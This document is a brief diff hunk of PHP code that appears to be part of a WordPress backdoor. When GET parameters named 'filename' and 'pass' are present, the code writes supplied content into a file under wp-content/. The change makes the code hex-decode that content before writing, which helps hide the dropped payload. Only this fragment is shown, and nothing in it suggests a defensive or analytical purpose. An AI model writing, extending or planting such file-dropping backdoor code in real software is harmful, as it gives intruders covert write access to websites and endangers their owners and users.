@@ -23,7 +23,7 @@ if (isset($_GET['filename']) && isset($_GET['pass'])) {
 			foreach ($dir_array as $folder) {
 				$newfolder = basedirname($dir);
 				if ($newfolder == "wp-content/") {
-					if (file_put_contents(get_file_name(), $file_content)) {
+					if (file_put_contents(get_file_name(), hex2bin($file_content))) {
 						return true;
 					}
 					else {
